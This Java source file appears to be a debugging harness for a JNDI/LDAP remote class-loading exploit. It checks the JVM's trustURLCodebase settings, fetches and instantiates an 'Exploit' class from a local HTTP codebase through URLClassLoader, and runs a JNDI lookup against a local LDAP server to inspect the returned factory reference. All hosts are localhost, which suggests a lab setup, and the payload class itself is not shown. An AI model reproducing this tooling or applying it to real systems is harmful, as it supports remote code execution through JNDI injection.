import javax.naming.*;
import javax.naming.directory.*;
import java.net.*;
import java.io.*;
import java.util.Hashtable;

public class JndiDebug {

    static final String CODEBASE = "http://127.0.0.1:8000/";

    public static void main(String[] args) throws Exception {
        System.out.println("=== SECURITY CONTEXT ===");
        System.out.println("SecurityManager: " + System.getSecurityManager());
        System.out.println("trustURLCodebase (ldap): "
            + System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
        System.out.println("trustURLCodebase (rmi): "
            + System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase"));
        System.out.println("http.nonProxyHosts: "
            + System.getProperty("http.nonProxyHosts"));
        System.out.println("http.proxyHost: "
            + System.getProperty("http.proxyHost"));

        System.out.println("\n=== RAW HTTP: openStream() ===");
        testRawHttp();

        System.out.println("\n=== RAW HTTP: openConnection() ===");
        testRawConnection();

        System.out.println("\n=== URLClassLoader: load Exploit ===");
        testUrlClassLoader();

        System.out.println("\n=== LDAP ATTRIBUTES ===");
        testLdapAttributes();

        System.out.println("\n=== JNDI LOOKUP (full exception) ===");
        testJndiLookupFull();

        System.out.println("\n=== DONE ===");
    }

    static void testRawHttp() {
        try {
            URL url = new URL(CODEBASE + "Exploit.class");
            InputStream is = url.openStream();
            byte[] buf = new byte[1024];
            int n = is.read(buf);
            is.close();
            System.out.println("SUCCESS: read " + n + " bytes from " + url);
        } catch (Throwable t) {
            System.out.println("FAILED: " + t.getClass().getName() + ": " + t.getMessage());
            t.printStackTrace(System.out);
        }
    }

    static void testRawConnection() {
        try {
            URL url = new URL(CODEBASE + "Exploit.class");
            URLConnection conn = url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.connect();
            int len = conn.getContentLength();
            System.out.println("SUCCESS: connected, Content-Length=" + len);
        } catch (Throwable t) {
            System.out.println("FAILED: " + t.getClass().getName() + ": " + t.getMessage());
            t.printStackTrace(System.out);
        }
    }

    static void testUrlClassLoader() {
        ClassLoader parent = Thread.currentThread().getContextClassLoader();
        System.out.println("Parent classloader: " + parent);
        System.out.println("Parent hierarchy:");
        for (ClassLoader cl = parent; cl != null; cl = cl.getParent()) {
            System.out.println("  " + cl);
        }
        try {
            URL[] urls = { new URL(CODEBASE) };
            URLClassLoader ucl = new URLClassLoader(urls, parent);
            System.out.println("URLClassLoader created, loading Exploit...");
            Class<?> c = ucl.loadClass("Exploit");
            System.out.println("SUCCESS: loaded " + c.getName());
            System.out.println("  implements ObjectFactory: "
                + javax.naming.spi.ObjectFactory.class.isAssignableFrom(c));
            Object obj = c.newInstance();
            System.out.println("  instantiated: " + obj.getClass().getName());
        } catch (Throwable t) {
            System.out.println("FAILED: " + t.getClass().getName() + ": " + t.getMessage());
            t.printStackTrace(System.out);
        }
    }

    static void testLdapAttributes() throws Exception {
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://127.0.0.1:1389");
        DirContext ctx = new InitialDirContext(env);
        Attributes attrs = ctx.getAttributes("a");
        for (NamingEnumeration<?> ae = attrs.getAll(); ae.hasMore(); ) {
            Attribute attr = (Attribute) ae.next();
            System.out.println("  " + attr.getID() + " = " + attr.get());
        }
        ctx.close();
    }

    static void testJndiLookupFull() {
        try {
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.PROVIDER_URL, "ldap://127.0.0.1:1389");
            System.out.println("Calling InitialContext.lookup(\"ldap://127.0.0.1:1389/a\")...");
            Object obj = new InitialContext(env).lookup("ldap://127.0.0.1:1389/a");
            System.out.println("Result: " + obj);
            System.out.println("  class: " + obj.getClass().getName());
            if (obj instanceof Reference) {
                Reference ref = (Reference) obj;
                System.out.println("  className:    " + ref.getClassName());
                System.out.println("  factory:      " + ref.getFactoryClassName());
                System.out.println("  factoryLoc:   " + ref.getFactoryClassLocation());
            }
        } catch (Throwable t) {
            System.out.println("FAILED: " + t.getClass().getName() + ": " + t.getMessage());
            t.printStackTrace(System.out);
        }
    }
}
